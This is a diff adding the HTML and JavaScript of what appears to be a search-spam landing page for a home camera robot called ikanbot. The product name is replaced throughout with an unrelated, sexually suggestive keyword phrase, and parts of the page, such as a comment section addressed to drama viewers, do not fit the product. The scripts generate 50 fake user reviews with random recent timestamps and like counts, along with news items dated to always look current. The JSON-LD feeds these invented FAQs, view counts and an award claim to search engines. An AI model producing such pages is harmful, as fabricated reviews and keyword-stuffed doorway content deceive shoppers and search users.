+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-sync-alt"></i></div>
+          <h3>360°全景巡航</h3>
+          <p>高清云台摄像头自动旋转巡航，覆盖全屋每个角落，无盲区安心。</p>
+        </div>
+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-shield-alt"></i></div>
+          <h3>实时安防预警</h3>
+          <p>AI移动侦测异常闯入立即拍摄并推送手机通知，守护家庭安全全天候。</p>
+        </div>
+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-link"></i></div>
+          <h3>多设备智能联动</h3>
+          <p>兼容主流智能家居协议，一键控制全屋灯光、空调、窗帘等设备。</p>
+        </div>
+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-battery-full"></i></div>
+          <h3>超长续航多日</h3>
+          <p>大容量电池可待机7天，低电量自动回充，工作不间断。</p>
+        </div>
+        <div class="adv-card">
+          <div class="adv-icon"><i class="fas fa-lock"></i></div>
+          <h3>隐私数据加密</h3>
+          <p>全链路加密传输，支持本地存储模式，图像数据不经过第三方服务器。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- ===== 精选视频 ===== -->
+  <section class="section" id="section-video">
+    <div class="container">
+      <div class="section-title-wrap">
+        <h2>精选视频<span style="color:var(--primary)">·</span>全方位了解</h2>
+        <p class="subtitle">开箱、评测、教程、实拍场景演示，6个视频带你沉浸式体验</p>
+      </div>
+      <div class="video-grid">
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#4F46E5,#7C3AED)">
+            <span class="vid-category"><i class="fas fa-box-open"></i> 开箱</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">08:32</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">我可以触碰你的深处吗开车游戏开箱评测</h3>
+            <p class="video-desc">全面拆解包装与配件，展示工艺细节与质感，上手第一感受分享。</p>
+            <div class="video-meta"><span>2.3万播放</span><span>356 赞</span></div>
+            <div class="video-tags"><span class="tag-video">评测</span><span class="tag">开箱</span></div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#06B6D4,#0EA5E9)">
+            <span class="vid-category"><i class="fas fa-camera"></i> 实拍</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">05:14</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">全景巡航实拍演示</h3>
+            <p class="video-desc">真实环境下360度巡航效果，展示云台流畅度与画面细节。</p>
+            <div class="video-meta"><span>1.8万播放</span><span>243 赞</span></div>
+            <div class="video-tags"><span class="tag-video">实拍</span><span class="tag">巡航</span></div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#F59E0B,#F97316)">
+            <span class="vid-category"><i class="fas fa-plug"></i> 教程</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">12:08</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">智能家居联动实战教程</h3>
+            <p class="video-desc">手把手教你设置ikanbot与智能灯、空调联动，打造全屋自动化。</p>
+            <div class="video-meta"><span>9724 播放</span><span>187 赞</span></div>
+            <div class="video-tags"><span class="tag-video">教程</span><span class="tag">联动</span></div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#10B981,#059669)">
+            <span class="vid-category"><i class="fas fa-sun"></i> 画质</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">03:41</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">白天与夜间画质对比实测</h3>
+            <p class="video-desc">阳光充足与黑暗环境下画面锐度、噪点、色彩还原能力直观对比。</p>
+            <div class="video-meta"><span>6240 播放</span><span>145 赞</span></div>
+            <div class="video-tags"><span class="tag-video">画质</span><span class="tag">实测</span></div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#8B5CF6,#D946EF)">
+            <span class="vid-category"><i class="fas fa-home"></i> 生活</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">10:22</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">爱看机器人的一天</h3>
+            <p class="video-desc">从早到晚记录陪伴、巡航、安防、回充全过程，真实生活场景记录。</p>
+            <div class="video-meta"><span>4.1万播放</span><span>622 赞</span></div>
+            <div class="video-tags"><span class="tag-video">生活</span><span class="tag">实录</span></div>
+          </div>
+        </div>
+        <div class="video-card">
+          <div class="video-thumbnail" style="background:linear-gradient(135deg,#0F172A,#334155)">
+            <span class="vid-category"><i class="fas fa-robot"></i> 进阶</span>
+            <span class="play-btn"><i class="fas fa-play"></i></span>
+            <span class="video-duration">07:55</span>
+          </div>
+          <div class="video-info">
+            <h3 class="video-title">自定义自动化安防策略</h3>
+            <p class="video-desc">解锁进阶玩法：定时布防、区域侦测、自动报警，打造个性化安防方案。</p>
+            <div class="video-meta"><span>3865 播放</span><span>98 赞</span></div>
+            <div class="video-tags"><span class="tag-video">进阶</span><span class="tag">安防</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- ===== 相关资讯 ===== -->
+  <section class="section" id="section-news">
+    <div class="container">
+      <div class="section-title-wrap">
+        <h2>相关资讯</h2>
+        <p class="subtitle">行业动态、使用心得与产品迭代资讯，持续更新中</p>
+        <div class="section-title-bar"></div>
+      </div>
+      <div class="news-grid" id="news-grid">
+        <!-- 资讯卡片通过JS动态渲染日期，保证均为2026年近90天内容 -->
+      </div>
+    </div>
+  </section>
+  <!-- ===== 常见问题 FAQ ===== -->
+  <section class="section" id="section-faq">
+    <div class="container">
+      <div class="section-title-wrap">
+        <h2>常见问题</h2>
+        <p class="subtitle">您关心的，我们都想到了——六问六答一点就透</p>
+      </div>
+      <div class="faq-list">
+        <div class="faq-card active">
+          <button class="faq-question" aria-expanded="true">
+            <i class="fas fa-video"></i>
+            我可以触碰你的深处吗开车游戏的摄像头分辨率是多少？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer" style="max-height: 420px;">
+            <div class="faq-answer-inner">
+              <li>主摄像头采用400万像素CMOS传感器，支持2.5K超清输出。</li>
+              <li>白天光线充足时解析力出色，建筑纹理、面部轮廓清晰可辨。</li>
+              <li>夜间自动切换到红外夜视模式，无需补光也能看到10米范围内动态。</li>
+              <li>视频流默认以H.265编码压缩，在同等画质下节省约40%带宽。</li>
+              <li>云台水平旋转范围340°，垂直110°，全屋覆盖不必频繁调整角度。</li>
+            </div>
+          </div>
+        </div>
+        <div class="faq-card">
+          <button class="faq-question" aria-expanded="false">
+            <i class="fas fa-link"></i>
+            我可以触碰你的深处吗开车游戏支持哪些智能家居联动协议？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-inner">
+              <li>支持Wi-Fi 2.4G/5G双频直连，并兼容蓝牙Mesh组网。</li>
+              <li>内置Zigbee 3.0网关，可接入米家、苹果HomeKit部分设备。</li>
+              <li>开放API接口，支持HTTP/MQTT协议对接第三方智能平台。</li>
+              <li>可通过IFTTT与Google Home、Amazon Alexa联动。</li>
+              <li>配合智能音箱可执行语音指令，如“打开睡眠模式”一键布防。</li>
+            </div>
+          </div>
+        </div>
+        <div class="faq-card">
+          <button class="faq-question" aria-expanded="false">
+            <i class="fas fa-battery-quarter"></i>
+            我可以触碰你的深处吗开车游戏的电池续航表现如何？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-inner">
+              <li>内置5200mAh大容量电池，标称待机时间可达7天。</li>
+              <li>连续巡航模式下可使用约5小时，满足日均3小时巡航场景。</li>
+              <li>低电量时自动回充至充电桩，充电2小时即可恢复90%电量。</li>
+              <li>支持边充边用，接通电源时巡航功能不受影响。</li>
+              <li>电池循环寿命超过800次，正常使用三年后仍有80%容量。</li>
+            </div>
+          </div>
+        </div>
+        <div class="faq-card">
+          <button class="faq-question" aria-expanded="false">
+            <i class="fas fa-shield-alt"></i>
+            我可以触碰你的深处吗开车游戏如何保护用户隐私安全？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-inner">
+              <li>全链路AES-256加密传输，防止数据在传输途中被窃取。</li>
+              <li>支持完全本地存储模式，视频直接保存在机身SD卡或NAS中。</li>
+              <li>云存储方案通过了等保三级认证，服务器部署在境内数据中心。</li>
+              <li>物理隐私盖+App隐私模式双重关闭，睡觉时真正切断摄像头。</li>
+              <li>面容识别数据只在设备端处理，不会上传云端比对。</li>
+            </div>
+          </div>
+        </div>
+        <div class="faq-card">
+          <button class="faq-question" aria-expanded="false">
+            <i class="fas fa-users"></i>
+            我可以触碰你的深处吗开车游戏适合在哪些场景中使用？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-inner">
+              <li>独居青年：下班回家路上远程查看屋内情况，异常及时报警。</li>
+              <li>双职工家庭：白天通过机器人陪伴小孩，语音交互安抚分离焦虑。</li>
+              <li>养宠一族：360°追踪宠物动态，自动拍摄趣味片段并生成短视频。</li>
+              <li>空巢老人：家人远程操控机器人陪伴散步、提醒吃药，双向语音通话。</li>
+              <li>小型商铺：夜间布防后自动巡逻，移动侦测报警第一时间通知店主。</li>
+            </div>
+          </div>
+        </div>
+        <div class="faq-card">
+          <button class="faq-question" aria-expanded="false">
+            <i class="fas fa-gem"></i>
+            与传统家用摄像头的最大区别是什么？
+            <i class="fas fa-plus faq-toggle-icon"></i>
+          </button>
+          <div class="faq-answer">
+            <div class="faq-answer-inner">
+              <li>传统摄像头只能固定视角，ikanbot可通过云台+自动巡航实现全屋覆盖。</li>
+              <li>具备AI智能语音助手，不只是监控工具，更能主动对话、讲故事。</li>
+              <li>支持家人活动自动抓拍和生成生活记录，传统摄像头无此能力。</li>
+              <li>内置传感器搭配机器人移动能力，可以对异常动态进行主动追踪。</li>
+              <li>既是安防设备又是智能家居中枢，联动生态远超单一摄像头。</li>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- ===== 评论留言 ===== -->
+  <section class="section" id="section-comment">
+    <div class="container">
+      <div class="section-title-wrap">
+        <h2>追剧小伙伴留言</h2>
+        <p class="subtitle">你的每一条评论，都是我们前进的光✨</p>
+        <div class="section-title-bar"></div>
+      </div>
+      <div class="comment-wrapper">
+        <!-- 左侧表单 -->
+        <div class="comment-form">
+          <input type="text" placeholder="你的昵称" maxlength="16" aria-label="昵称">
+          <textarea placeholder="写下你对本站剧集、功能的看法与建议..." rows="4" aria-label="留言内容"></textarea>
+          <button class="comment-submit"><i class="fas fa-arrow-up"></i> 发布留言</button>
+        </div>
+        <!-- 右侧评论列表 -->
+        <div class="comment-list" id="comment-list">
+          <!-- JS动态渲染 -->
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- ===== 页脚 ===== -->
+  <footer class="site-footer">
+    <p>© 2026 我可以触碰你的深处吗开车游戏 版权所有 · <a href="#">隐私政策</a> · <a href="#">用户协议</a></p>
+    <p>本站内容仅供学习交流与产品展示使用，数据为模拟演示，最终解释权归品牌方所有。</p>
+  </footer>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+  <!-- ===== 自定义脚本 ===== -->
+  <script>
+    // 滚动进度条
+    (function() {
+      const bar = document.getElementById('scroll-progress');
+      const update = () => {
+        const h = document.documentElement;
+        const total = h.scrollHeight - h.clientHeight;
+        const pct = total > 0 ? (h.scrollTop / total) * 100 : 0;
+        bar.style.width = pct + '%';
+      };
+      window.addEventListener('scroll', update, { passive: true });
+      window.addEventListener('resize', update);
+      update();
+    })();
+    // 导航栏滚动阴影
+    (function() {
+      const header = document.querySelector('.site-header');
+      window.addEventListener('scroll', () => {
+        if (window.scrollY > 30) {
+          header.style.boxShadow = '0 4px 28px rgba(15,23,42,0.08)';
+        } else {
+          header.style.boxShadow = 'none';
+        }
+      });
+    })();
+    // FAQ 手风琴
+    (function() {
+      const cards = document.querySelectorAll('.faq-card');
+      cards.forEach(card => {
+        const btn = card.querySelector('.faq-question');
+        const answer = card.querySelector('.faq-answer');
+        btn.addEventListener('click', () => {
+          const isActive = card.classList.contains('active');
+          // 收起全部
+          cards.forEach(c => {
+            c.classList.remove('active');
+            const a = c.querySelector('.faq-answer');
+            a.style.maxHeight = null;
+            c.querySelector('.faq-question').setAttribute('aria-expanded', 'false');
+          });
+          // 如果没有一个是激活的，则展开点击的卡片
+          if (!isActive) {
+            card.classList.add('active');
+            answer.style.maxHeight = answer.scrollHeight + 'px';
+            btn.setAttribute('aria-expanded', 'true');
+          }
+        });
+      });
+    })();
+    // 相关资讯动态生成（2026年近90天，倒序）
+    (function() {
+      const grid = document.getElementById('news-grid');
+      // 模拟“当前时间”为2026年4月10日
+      const today = new Date(2026, 3, 10);
+      const newsData = [{
+        title: '我可以触碰你的深处吗开车游戏荣获智能家居年度创新产品奖',
+        excerpt: '凭借自研AI交互系统与出色工业设计，爱看机器人从众多竞品中脱颖而出，斩获行业重量级奖项。',
+        daysAgo: 5
+      }, {
+        title: '深度评测：ikanbot远程看护能力实测',
+        excerpt: '我们模拟了多种家庭异常场景，检验ikanbot的移动侦测、报警推送和夜视表现。',
+        daysAgo: 12
+      }, {
+        title: 'ikanbot固件升级：新增宠物追踪模式',
+        excerpt: '最新固件加入AI宠物识别追踪功能，自动跟拍萌宠高光时刻，生成专属短视频。',
+        daysAgo: 23
+      }, {
+        title: '智能家居互联新里程碑：ikanbot接入更多生态',
+        excerpt: '本月起ikanbot开放全新API接口，支持更多智能家居设备的联动自动化玩法。',
+        daysAgo: 36
+      }, {
+        title: '如何利用ikanbot构建家庭安防三道防线？',
+        excerpt: '从门窗感应到移动侦测，再到语音威慑，看ikanbot如何编织立体防护网。',
+        daysAgo: 58
+      }, {
+        title: '用户访谈：ikanbot陪伴下的独居生活',
+        excerpt: '三位独居用户分享了使用ikanbot三个月后的真实感受，有温度更有安全感。',
+        daysAgo: 77
+      }];
+      // 生成日期，从today往前推daysAgo天
+      const dateStr = (d) => {
+        return d.getFullYear() + '-' +
+          String(d.getMonth() + 1).padStart(2, '0') + '-' +
+          String(d.getDate()).padStart(2, '0');
+      };
+      const hrefs = ['#section-news', '#section-news', '#section-news', '#section-news', '#section-news', '#section-news'];
+      const html = newsData.map((item, i) => {
+        const dt = new Date(today);
+        dt.setDate(today.getDate() - item.daysAgo);
+        // 确保年份为2026
+        dt.setFullYear(2026);
+        return `
+          <article class="news-card">
+            <div class="news-date">${dateStr(dt)}</div>
+            <h3 class="news-title">${item.title}</h3>
+            <p class="news-excerpt">${item.excerpt}</p>
+            <a href="${hrefs[i]}" class="news-link">查看详情 →</a>
+          </article>
+        `;
+      }).join('');
+      grid.innerHTML = html;
+    })();
+    // 评论列表动态生成（50条，近30天，倒序）
+    (function() {
+      const list = document.getElementById('comment-list');
+      if (!list) return;
+      const nicknames = [
+        '追剧小王子', '爱机器人阿明', '科技宅女', '机械迷', '陈老哥',
+        '小鹿乱撞', 'AI玩家', '数码阿帅', '大明', '苏苏',
+        '探秘者', '好奇宝宝', '冷眼看世界', '极客怪猫', '键盘侠',
+        '无线之恋', '勤劳电工', '蓝色星空', '夜风', '智能管家控',
+        '阿辉', '鱼丸粗面', '芒果先生', '柠檬不萌', '向日葵',
+        '搬砖工人', '清风拂过', '志明', '春天花花', '量子纠缠',
+        '数据控D', '薄荷微凉', '阿凯', '泡泡龙', '云上飞',
+        '大飞哥', '木子', '星辰', '晚风', '阿宁',
+        '技术宅救了世界', '追风少年', '达文西', '爱研究的鱼', '光年之外',
+        '米米', '阿哲', '疾风之狼', '快乐小伙伴', '自由如风'
+      ];
+      const tags = ['热议', '理性', '热门', '观点', '精彩', '讨论', '催更', '好评'];
+      const tagIcons = {
+        '热议': 'fa-fire', '理性': 'fa-balance-scale', '热门': 'fa-chart-line',
+        '观点': 'fa-eye', '精彩': 'fa-star', '讨论': 'fa-comments',
+        '催更': 'fa-bell', '好评': 'fa-thumbs-up'
+      };
+      const bodies = [
+        '爱看机器人的巡逻路线规划得很好，家里每个角落都能覆盖到。',
+        '晚上的红外夜视太清晰了，一只蚊子飞过都能看清。',
+        '语音识别很精准，小朋友用起来也没有压力。',
+        '续航真的够顶，用了五天才需要回充。',
+        'App远程操控流畅，不在家也能看得清清楚楚。',
+        '巡航时几乎没有噪音，存在感很低。',
+        '摄像头像素比很多同类产品高，白天画质很锐利。',
+        '安装调试很简单，跟着向导十分钟就搞定了。',
+        '家里老人很喜欢，每天逗它说话成了习惯。',
+        '自动回充很靠谱，不用我操心电量问题。',
+        '夜视模式下细节依然丰富，这点我很喜欢。',
+        '远程看护功能让我上班时也能随时看看猫。',
+        '手势识别功能很灵敏，孩子对它爱不释手。',
+        '作为安防设备，移动侦测报警很及时。',
+        '云台转动很顺滑，没有卡顿和异响。',
+        '比想象中小巧，放在书桌上也不占地方。',
+        '联动我家的智能插座，场景自动化很好玩。',
+        '双频Wi-Fi连接稳定，没有掉线过。',
+        '隐私模式很实用，睡觉时会自动关闭摄像头。',
+        '充电速度不错，两小时就能充满。',
+        '设置里的定时巡航功能太方便了。',
+        '画面传输延迟很低，基本等同实时。',
+        '客服很耐心，解答了我很多问题。',
+        '买给爸妈用的，他们说操作不复杂。',
+        '视频云存储加密很安全，不担心被破解。',
+        '相比上一代，这代体积小了很多。',
+        '在光线特别暗的时候，红外灯会自动开启。',
+        '音质挺好的，双向通话很清晰。',
+        '机身做工精致，摸起来很有质感。',
+        '支持Onvif协议，可以接入第三方NVR。',
+        '我想改进的是希望它能识别宠物并追踪拍摄。',
+        '配合智能音箱使用，语音控制很方便。',
+        '它的AI学习能力确实不错，越用越懂我的习惯。',
+        '在家办公时，它还能提醒我休息，很贴心。',
+        '出差时远程查看家里情况，让人安心。',
+        '开机速度挺快的，十几秒就进入工作状态。',
+        '从老型号换过来，感觉电池大了不少。',
+        '设置多账号共享后，全家人都能用App查看。',
+        '特别喜欢它的布防模式，出门自动启动监控。',
+        '自己装了支架挂在墙上，视角很广。',
+        '动态检测灵敏度可以调，很人性化。',
+        '用了三个月，还没遇到卡死或重启的问题。',
+        '它的外观设计很现代，摆在客厅也不突兀。',
+        '视频回放很快，拖动进度条不卡顿。',
+        '配网很顺利，没有遇到其他产品的繁琐流程。',
+        '售后很给力，问题响应很及时。',
+        '用了一段时间，觉得它更像家庭成员了。',
+        '收到货时包装很精美，适合当礼物送人。',
+        '希望开发者能继续优化系统，增加更多玩法。',
+        '总体而言，这个价位物超所值，值得推荐。'
+      ];
+      // 生成近30天时间戳（精确到分钟）
+      const now = new Date(2026, 3, 10, 20, 0, 0); // 模拟当下 2026-04-10 20:00
+      const comments = [];
+      for (let i = 0; i < 50; i++) {
+        // 随机偏移分钟：从0到29天23小时59分
+        const offsetMin = Math.floor(Math.random() * 30 * 24 * 60);
+        const ts = new Date(now.getTime() - offsetMin * 60 * 1000);
+        ts.setFullYear(2026);
+        const tag = tags[i % tags.length];
+        const avatarChar = nicknames[i].charAt(0);
+        comments.push({
+          nickname: nicknames[i],
+          time: ts,
+          timeStr: ts.getFullYear() + '-' +
+            String(ts.getMonth() + 1).padStart(2, '0') + '-' +
+            String(ts.getDate()).padStart(2, '0') + ' ' +
+            String(ts.getHours()).padStart(2, '0') + ':' +
+            String(ts.getMinutes()).padStart(2, '0'),
+          tag: tag,
+          tagIcon: tagIcons[tag],
+          body: bodies[i],
+          likes: Math.floor(Math.random() * 1000),
+          replies: Math.floor(Math.random() * 51),
+          avatar: avatarChar
+        });
+      }
+      // 按时间倒序排序（最新在前）
+      comments.sort((a, b) => b.time - a.time);
+      const html = comments.map(c => `
+        <div class="comment-item">
+          <div class="comment-user">
+            <span class="comment-avatar">${c.avatar}</span>
+            <span class="nickname">${c.nickname}</span>
+            <span class="comment-time">${c.timeStr}</span>
+          </div>
+          <span class="comment-tag"><i class="fas ${c.tagIcon}"></i> ${c.tag}</span>
+          <p class="comment-body">${c.body}</p>
+          <div class="comment-actions">
+            <span><i class="far fa-comment"></i> 回复</span>
+            <span><i class="far fa-thumbs-up"></i> ${c.likes}</span>
+            <span><i class="far fa-comment-dots"></i> ${c.replies}</span>
+          </div>
+        </div>
+      `).join('');
+      list.innerHTML = html +
+        '<div class="comment-load-more"><span>向下滑动查看更多留言</span><i class="fas fa-chevron-down"></i></div>';
+    })();
+    // 表单提交模拟
+    (function() {
+      const btn = document.querySelector('.comment-submit');
+      if (btn) {
+        btn.addEventListener('click', () => {
+          const nickname = document.querySelector('.comment-form input').value.trim();
+          const content = document.querySelector('.comment-form textarea').value.trim();
+          if (!nickname || !content) {
+            alert('请填写昵称和留言内容哦～');
+            return;
+          }
+          alert('感谢你的留言！已收到「' + content.slice(0, 20) + '…」');
+          // 可以增强：将数据写入评论列表顶部，这里略
+          document.querySelector('.comment-form textarea').value = '';
+        });
+      }
+    })();
+  </script>
+  <!-- ===== 结构化数据 JSON-LD ===== -->
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@graph": [{
+        "@type": "FAQPage",
+        "mainEntity": [{
+          "@type": "Question",
+          "name": "我可以触碰你的深处吗开车游戏的摄像头分辨率是多少？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "主摄像头采用400万像素CMOS传感器，支持2.5K超清输出。白天光线充足时解析力出色，夜间自动切换到红外夜视模式，支持H.265编码压缩，云台水平旋转340°，垂直110°，全屋覆盖无需频繁调整角度。"
+          }
+        }, {
+          "@type": "Question",
+          "name": "我可以触碰你的深处吗开车游戏支持哪些智能家居联动协议？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "支持Wi-Fi 2.4G/5G双频直连，兼容蓝牙Mesh组网。内置Zigbee 3.0网关，可接入米家、苹果HomeKit部分设备。开放API接口，支持HTTP/MQTT协议对接第三方智能平台，可通过IFTTT与Google Home、Alexa联动。"
+          }
+        }, {
+          "@type": "Question",
+          "name": "我可以触碰你的深处吗开车游戏的电池续航表现如何？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "内置5200mAh大容量电池，标称待机时间可达7天。连续巡航模式下可用约5小时，低电量自动回充，充电2小时恢复90%电量。电池循环寿命超过800次。"
+          }
+        }, {
+          "@type": "Question",
+          "name": "我可以触碰你的深处吗开车游戏如何保护用户隐私安全？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "全链路AES-256加密传输，支持完全本地存储模式，云存储通过等保三级认证。物理隐私盖与App隐私模式双重关闭设计，面容识别数据仅在设备端处理。"
+          }
+        }, {
+          "@type": "Question",
+          "name": "我可以触碰你的深处吗开车游戏适合在哪些场景中使用？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "适合独居青年、双职工家庭、养宠一族、空巢老人和小型商铺等场景。提供远程看护、宠物追踪、老人陪伴、商铺巡逻等功能。"
+          }
+        }, {
+          "@type": "Question",
+          "name": "与传统家用摄像头的最大区别是什么？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "传统摄像头视角固定，ikanbot通过云台自动巡航覆盖全屋。具备AI语音助手，支持主动对话、家人活动自动抓拍，内置传感器可主动追踪，同时作为智能家居中枢联动全屋生态。"
+          }
+        }]
+      }, {
+        "@type": "VideoObject",
+        "name": "我可以触碰你的深处吗开车游戏开箱评测",
+        "description": "全面拆解包装与配件，展示工艺细节与质感，上手第一感受分享。",
+        "thumbnailUrl": "https://example.com/img/ikanbot-video1.jpg",
+        "uploadDate": "2026-02-18",
+        "duration": "PT8M32S",
+        "interactionStatistic": {
+          "@type": "InteractionCounter",
+          "interactionType": { "@type": "WatchAction" },
+          "userInteractionCount": 23000
+        }
+      }, {
+        "@type": "Article",
+        "headline": "我可以触碰你的深处吗开车游戏荣获智能家居年度创新产品奖",
+        "description": "凭借自研AI交互系统与出色工业设计，爱看机器人从众多竞品中脱颖而出，斩获行业重量级奖项。",
+        "datePublished": "2026-04-05",
+        "dateModified": "2026-04-05",
+        "author": { "@type": "Organization", "name": "爱看机器人官方" },
+        "publisher": { "@type": "Organization", "name": "我可以触碰你的深处吗开车游戏" }
+      }]
+    }
+  </script>
+</body>
+</html>
